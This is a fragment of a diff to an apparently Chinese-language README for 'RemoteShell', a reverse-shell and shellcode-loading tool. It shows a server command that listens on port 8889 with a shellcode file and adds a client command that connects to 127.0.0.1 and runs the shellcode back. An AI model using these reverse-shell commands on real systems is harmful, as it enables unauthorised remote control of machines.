@@ -90,10 +90,9 @@ Shell> RemoteShell.exe RunServer --type tcp --listen 8889 --shellcode d://shellc
 [*] TCP服务端启动端口: 8889 正在等待上线.
 ```
 
+此时客户端执行如下命令，意思是主动连接到服务端`127.0.0.1`下面的`8889`端口并执行ShellCode反弹。
+```C
+Shell> RemoteShell.exe RunClient --type tcp --address 127.0.0.1 --port 8889
+```
 
-
-
-
-
-
-
+GitHub项目地址：https://github.com/lyshark/RemoteShell
